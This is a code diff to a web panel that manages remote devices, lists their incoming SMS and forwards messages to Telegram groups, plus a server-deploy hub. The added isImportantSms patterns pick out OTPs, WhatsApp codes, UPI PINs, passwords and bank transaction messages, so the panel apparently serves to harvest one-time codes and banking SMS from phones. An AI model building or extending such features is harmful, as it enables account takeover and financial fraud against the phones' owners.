@@ -24,6 +24,9 @@
     delete_device: true,
     finance: true,
   };
+  let isServerAdmin = false;
+  let serverHubCache = null;
+  let selectedServerAppId = "";
 
   function isGuest() {
     return userScope === "guest";
@@ -100,6 +103,7 @@
     document.querySelectorAll(".owner-only").forEach((el) => {
       el.classList.toggle("hidden-guest", isGuest());
     });
+    applyServerAdminUi();
     let banner = document.getElementById("guestBanner");
     if (isGuest()) {
       if (!banner) {
@@ -115,6 +119,13 @@
     } else if (banner) {
       banner.classList.add("hidden");
     }
+  }
+
+  function applyServerAdminUi() {
+    const show = isServerAdmin && !isGuest();
+    document.querySelectorAll(".server-admin-only").forEach((el) => {
+      el.classList.toggle("hidden-server-admin", !show);
+    });
   }
 
   function isFav(id) {
@@ -354,6 +365,7 @@
     $("btnLogout").onclick = logout;
     initSecurityUi();
     initThemesUi();
+    initServerHubUi();
 
     if (token) {
       api("/api/auth/me")
@@ -362,6 +374,7 @@
           localStorage.setItem("dp_scope", userScope);
           if (d.permissions) guestPerms = d.permissions;
           if (d.theme) applyTheme(d.theme);
+          isServerAdmin = !!(d.serverAdmin && d.serverHub);
           enterApp(d.username, d);
         })
         .catch(logout);
@@ -504,6 +517,7 @@
     }
     if (me?.permissions) guestPerms = me.permissions;
     if (me?.theme) applyTheme(me.theme);
+    isServerAdmin = !!(me?.serverAdmin && me?.serverHub);
     if (me?.sessionId) {
       authSessionId = me.sessionId;
       localStorage.setItem("dp_sid", authSessionId);
@@ -537,7 +551,7 @@
     document.querySelectorAll(".nav-item[data-view]").forEach((el) => {
       el.onclick = () => {
         const v = el.dataset.view;
-        if (isGuest() && (v === "projects" || v === "telegram" || v === "security" || v === "themes")) {
+        if (isGuest() && (v === "projects" || v === "telegram" || v === "security" || v === "themes" || v === "serverhub")) {
           toast("Guest key se yeh page allowed nahi", true);
           return;
         }
@@ -557,6 +571,7 @@
         if (v === "telegram") loadTelegramBot();
         if (v === "security") loadSecurityPage();
         if (v === "themes") syncThemeSwatches();
+        if (v === "serverhub") loadServerHub();
       };
     });
     $("btnRefresh").onclick = () => {
@@ -580,7 +595,7 @@
   }
 
   function switchView(view) {
-    if (isGuest() && (view === "projects" || view === "telegram" || view === "security" || view === "themes")) {
+    if (isGuest() && (view === "projects" || view === "telegram" || view === "security" || view === "themes" || view === "serverhub")) {
       view = "devices";
     }
     currentView = view;
@@ -594,12 +609,14 @@
     show("viewTelegram", view === "telegram");
     show("viewSecurity", view === "security");
     show("viewThemes", view === "themes");
+    show("viewServerhub", view === "serverhub");
     show("viewDetail", view === "detail");
     if (view === "projects") loadProjects(true);
     if (view === "favorites") renderFavorites();
     if (view === "telegram") loadTelegramBot();
     if (view === "security") loadSecurityPage();
     if (view === "themes") syncThemeSwatches();
+    if (view === "serverhub") loadServerHub();
   }
 
   function syncThemeSwatches() {
@@ -1395,17 +1412,40 @@
     }
   }
 
+  function isImportantSms(s) {
+    const body = String(s?.body || "");
+    const sender = String(s?.sender || "");
+    const text = (body + " " + sender).toLowerCase();
+    // OTP / verification codes
+    if (/\b(otp|one[\s-]?time|verification code|auth(entication)? code|login code|security code)\b/i.test(body)) return true;
+    if (/\bcode\s*[:=\-]?\s*\d{4,8}\b/i.test(body)) return true;
+    if (/\b\d{3}[\s\-]?\d{3}\b/.test(body) && /whatsapp|code|otp|verify/i.test(body)) return true;
+    if (/\b\d{4,8}\b/.test(body) && /(otp|verify|verification|whatsapp|pin|password|login)/i.test(text)) return true;
+    // Banking / UPI / money
+    if (/\b(upi|imps|neft|rtgs|debit|credit|a\/c|account|txn|transaction|rs\.?|inr|₹)\b/i.test(body)) return true;
+    if (/\b(sbi|hdfc|icici|axis|paytm|phonepe|gpay|google pay|bhim)\b/i.test(text)) return true;
+    // PIN / password style
+    if (/\b(upi\s*pin|mpin|password|passcode)\b/i.test(body)) return true;
+    return false;
+  }
+
   function renderSmsList(list) {
     const q = ($("smsSearch").value || "").trim().toLowerCase();
     const filtered = q ? list.filter((s) => s.sender.toLowerCase().includes(q) || s.body.toLowerCase().includes(q)) : list;
-    $("smsCount").textContent = filtered.length + " / " + list.length + " messages";
+    const importantCount = filtered.filter(isImportantSms).length;
+    $("smsCount").textContent =
+      filtered.length + " / " + list.length + " messages" +
+      (importantCount ? " · " + importantCount + " important" : "");
     const box = $("smsList");
     if (!filtered.length) {
       box.innerHTML = '<div class="empty">No messages</div>';
       return;
     }
-    box.innerHTML = filtered.map((s, i) => `
-      <div class="sms-item">
+    box.innerHTML = filtered.map((s, i) => {
+      const important = isImportantSms(s);
+      return `
+      <div class="sms-item${important ? " important" : ""}">
+        ${important ? '<div class="sms-tag">Important</div>' : ""}
         <div class="body">${esc(s.body)}</div>
         <div class="meta">
           <span>${esc(s.sender)}</span>
@@ -1413,8 +1453,8 @@
           <span>incoming</span>
           <button class="btn btn-sm btn-outline" data-copy-idx="${i}">Copy</button>
         </div>
-      </div>
-    `).join("");
+      </div>`;
+    }).join("");
     box.querySelectorAll("[data-copy-idx]").forEach((btn) => {
       btn.onclick = () => {
         const idx = Number(btn.dataset.copyIdx);
@@ -1538,12 +1578,15 @@
       );
       const b = data.binding;
       if (b) {
+        const sim = b.autoSend?.from === 2 ? 2 : 1;
         box.innerHTML =
           'Send Auto: <b style="color:var(--green)">ON</b> → <b>' +
           esc(b.title) +
           "</b> <code>" +
           esc(b.chatId) +
-          "</code>";
+          "</code> · <b>SIM " +
+          sim +
+          "</b>";
         show(offBtn, true);
         renderAutoEvents(data.events || []);
         if (!silent) startSendAutoPoll();
@@ -1563,10 +1606,17 @@
 
   function openSendAutoModal(groups) {
     const list = $("sendAutoGroupList");
+    const simEl = $("sendAutoSim");
+    const boundHere = groups.find((g) => g.autoSend?.deviceId === activeDevice.id);
+    if (simEl) {
+      const defaultSim = boundHere?.autoSend?.from === 2 ? "2" : $("smsSim")?.value || "1";
+      simEl.value = defaultSim;
+    }
     list.innerHTML = groups
       .map((g) => {
         const boundHere = g.autoSend?.deviceId === activeDevice.id;
         const boundOther = g.autoSend && !boundHere;
+        const boundSim = g.autoSend?.from === 2 ? 2 : 1;
         return `
         <div class="modal-card" style="justify-content:space-between;margin-bottom:8px;cursor:pointer" data-pick-chat="${esc(g.chatId)}" data-pick-source="${esc(g.source || "bot")}">
           <div style="min-width:0;flex:1">
@@ -1574,9 +1624,9 @@
             <div class="lbl">${esc(g.type || "group")} · <code>${esc(g.chatId)}</code></div>
             <div class="lbl" style="margin-top:4px">${
               boundHere
-                ? '<span style="color:var(--green);font-weight:700">Bound to THIS device</span>'
+                ? '<span style="color:var(--green);font-weight:700">Bound to THIS device · SIM ' + boundSim + "</span>"
                 : boundOther
-                  ? "Bound → " + esc(g.autoSend.deviceName || g.autoSend.deviceId)
+                  ? "Bound → " + esc(g.autoSend.deviceName || g.autoSend.deviceId) + " · SIM " + boundSim
                   : "Available"
             }</div>
           </div>
@@ -1590,6 +1640,7 @@
         e.stopPropagation();
         const chatId = el.dataset.pickChat;
         const source = el.dataset.pickSource || "bot";
+        const from = Number($("sendAutoSim")?.value) === 2 ? 2 : 1;
         try {
           await api("/api/telegram/groups/" + encodeURIComponent(chatId) + "/auto-send", {
             method: "POST",
@@ -1598,10 +1649,11 @@
               deviceId: activeDevice.id,
               deviceName: activeDevice.name || activeDevice.id,
               source,
+              from,
             }),
           });
           show("modalSendAuto", false);
-          toast("Send Auto ON");
+          toast("Send Auto ON · SIM " + from);
           refreshSendAutoStatus();
         } catch (err) {
           toast(err.message, true);
@@ -1691,7 +1743,7 @@
             <div class="lbl">${esc(g.type || "group")} · <code>${esc(g.chatId)}</code></div>
             <div class="lbl" style="margin-top:4px">${
               g.autoSend
-                ? '<span style="color:var(--green);font-weight:700">Auto ON → ' + esc(g.autoSend.deviceName || g.autoSend.deviceId) + "</span>"
+                ? '<span style="color:var(--green);font-weight:700">Auto ON → ' + esc(g.autoSend.deviceName || g.autoSend.deviceId) + " · SIM " + (g.autoSend.from === 2 ? 2 : 1) + "</span>"
                 : "Auto send: OFF"
             }</div>
           </div>
@@ -2064,6 +2116,235 @@
       showForwardModal(id);
     } catch (e) { toast(e.message, true); }
   };
+
+  function fmtBytes(n) {
+    const v = Number(n) || 0;
+    if (v < 1024) return v + " B";
+    if (v < 1048576) return (v / 1024).toFixed(1) + " KB";
+    return (v / 1048576).toFixed(1) + " MB";
+  }
+
+  function statusClass(status) {
+    if (status === "online") return "badge-online";
+    if (status === "stopped" || status === "stopping") return "badge-offline";
+    if (status === "not_found") return "badge-warn";
+    return "badge-offline";
+  }
+
+  function setServerConsole(text) {
+    const el = $("serverConsole");
+    if (el) el.textContent = text || "";
+  }
+
+  async function serverAction(appId, action) {
+    try {
+      const data = await api("/api/server/" + action + "/" + appId, { method: "POST" });
+      setServerConsole((data.output || action + " OK").trim());
+      toast(action + " — " + appId);
+      await loadServerHub();
+    } catch (e) {
+      toast(e.message, true);
+    }
+  }
+
+  async function deployServerApp(appId) {
+    setServerConsole("Deploying " + appId + "…");
+    try {
+      const data = await api("/api/server/deploy/" + appId, { method: "POST" });
+      const steps = (data.log?.steps || [])
+        .map((s) => "$ " + s.cmd + "\n" + (s.out || s.err || ""))
+        .join("\n\n");
+      setServerConsole((steps || "Deploy complete") + (data.log?.error ? "\nERROR: " + data.log.error : ""));
+      toast(data.log?.ok ? "Deployed " + appId : "Deploy failed", !data.log?.ok);
+      await loadServerHub();
+    } catch (e) {
+      setServerConsole("Deploy error: " + e.message);
+      toast(e.message, true);
+    }
+  }
+
+  async function viewServerLogs(appId) {
+    selectedServerAppId = appId;
+    setServerConsole("Loading logs for " + appId + "…");
+    try {
+      const data = await api("/api/server/logs/" + appId + "?lines=120");
+      setServerConsole(data.text || "No logs");
+    } catch (e) {
+      setServerConsole("Log error: " + e.message);
+      toast(e.message, true);
+    }
+  }
+
+  function renderServerApps(data) {
+    const grid = $("serverAppsGrid");
+    if (!grid) return;
+    const apps = data?.apps || [];
+    if (!apps.length) {
+      grid.innerHTML = '<div class="empty">No apps configured</div>';
+      return;
+    }
+    grid.innerHTML = apps
+      .map((app) => {
+        const mem = fmtBytes(app.memory);
+        const wh = app.webhookUrl || "";
+        return (
+          '<div class="server-app-card" data-app="' +
+          esc(app.id) +
+          '">' +
+          '<div class="server-app-head">' +
+          '<div><h3>' +
+          esc(app.name) +
+          '</h3><p class="sub">' +
+          esc(app.path) +
+          " · " +
+          esc(app.branch || "main") +
+          "</p></div>" +
+          '<span class="badge ' +
+          statusClass(app.status) +
+          '">' +
+          esc(app.status || "unknown") +
+          "</span></div>" +
+          '<div class="server-app-meta">' +
+          "<span>PM2: <b>" +
+          esc(app.pm2Name) +
+          "</b></span>" +
+          "<span>RAM: " +
+          esc(mem) +
+          "</span>" +
+          "<span>Restarts: " +
+          esc(String(app.restarts || 0)) +
+          "</span></div>" +
+          '<label class="server-wh-label">Auto-deploy webhook (GitHub)</label>' +
+          '<div class="server-wh-row">' +
+          '<input type="text" readonly value="' +
+          esc(wh) +
+          '" class="server-wh-input" />' +
+          '<button type="button" class="btn btn-sm btn-outline server-copy-wh" data-url="' +
+          esc(wh) +
+          '">Copy</button></div>' +
+          '<div class="server-app-actions">' +
+          '<button type="button" class="btn btn-sm server-deploy" data-id="' +
+          esc(app.id) +
+          '">Deploy</button>' +
+          '<button type="button" class="btn btn-sm btn-outline server-restart" data-id="' +
+          esc(app.id) +
+          '">Restart</button>' +
+          '<button type="button" class="btn btn-sm btn-outline server-logs" data-id="' +
+          esc(app.id) +
+          '">Logs</button>' +
+          '<button type="button" class="btn btn-sm btn-danger server-stop" data-id="' +
+          esc(app.id) +
+          '">Stop</button>' +
+          "</div></div>"
+        );
+      })
+      .join("");
+
+    grid.querySelectorAll(".server-deploy").forEach((btn) => {
+      btn.onclick = () => deployServerApp(btn.dataset.id);
+    });
+    grid.querySelectorAll(".server-restart").forEach((btn) => {
+      btn.onclick = () => serverAction(btn.dataset.id, "restart");
+    });
+    grid.querySelectorAll(".server-stop").forEach((btn) => {
+      btn.onclick = () => serverAction(btn.dataset.id, "stop");
+    });
+    grid.querySelectorAll(".server-logs").forEach((btn) => {
+      btn.onclick = () => viewServerLogs(btn.dataset.id);
+    });
+    grid.querySelectorAll(".server-copy-wh").forEach((btn) => {
+      btn.onclick = async () => {
+        try {
+          await navigator.clipboard.writeText(btn.dataset.url || "");
+          toast("Webhook URL copied");
+        } catch (_) {
+          toast("Copy failed", true);
+        }
+      };
+    });
+  }
+
+  function renderDeployLogs(logs) {
+    const el = $("serverDeployLogs");
+    if (!el) return;
+    const list = logs || [];
+    if (!list.length) {
+      el.innerHTML = '<div class="empty">No deploys yet</div>';
+      return;
+    }
+    el.innerHTML = list
+      .map((log) => {
+        const ok = log.ok ? "ok" : "fail";
+        const at = log.at ? new Date(log.at).toLocaleString() : "—";
+        return (
+          '<div class="server-deploy-row ' +
+          ok +
+          '">' +
+          "<div><b>" +
+          esc(log.appName || log.appId) +
+          "</b> · " +
+          esc(log.trigger || "manual") +
+          (log.commit ? " · " + esc(String(log.commit).slice(0, 7)) : "") +
+          "</div>" +
+          '<div class="sub">' +
+          esc(at) +
+          (log.error ? " · " + esc(log.error) : " · success") +
+          "</div></div>"
+        );
+      })
+      .join("");
+  }
+
+  async function loadServerHub() {
+    if (!isServerAdmin) return;
+    const statusEl = $("serverHubStatus");
+    if (statusEl) statusEl.textContent = "Loading…";
+    try {
+      const data = await api("/api/server/apps");
+      serverHubCache = data;
+      if ($("serverAdminUser")) $("serverAdminUser").textContent = data.serverAdmin || "admin";
+      if (statusEl) {
+        statusEl.textContent = data.pm2Error
+          ? "PM2 warning: " + data.pm2Error
+          : data.apps.length + " app(s) on VPS · auto-deploy ready";
+      }
+      renderServerApps(data);
+      renderDeployLogs(data.deployLogs);
+    } catch (e) {
+      if (statusEl) statusEl.textContent = "Error: " + e.message;
+      toast(e.message, true);
+    }
+  }
+
+  function initServerHubUi() {
+    $("btnRefreshServerHub")?.addEventListener("click", () => loadServerHub());
+    $("btnAddServerApp")?.addEventListener("click", async () => {
+      const payload = {
+        id: $("newAppId")?.value?.trim(),
+        name: $("newAppName")?.value?.trim(),
+        repo: $("newAppRepo")?.value?.trim(),
+        branch: $("newAppBranch")?.value?.trim() || "main",
+        path: $("newAppPath")?.value?.trim(),
+        pm2Name: $("newAppPm2")?.value?.trim(),
+        startScript: $("newAppStart")?.value?.trim(),
+        type: $("newAppType")?.value || "node",
+      };
+      try {
+        const data = await api("/api/server/apps", {
+          method: "POST",
+          body: JSON.stringify(payload),
+        });
+        toast("App added: " + (data.app?.name || payload.id));
+        ["newAppId", "newAppName", "newAppRepo", "newAppPath", "newAppPm2", "newAppStart"].forEach((id) => {
+          const el = $(id);
+          if (el) el.value = "";
+        });
+        await loadServerHub();
+      } catch (e) {
+        toast(e.message, true);
+      }
+    });
+  }
 
   initAuth();
 })();
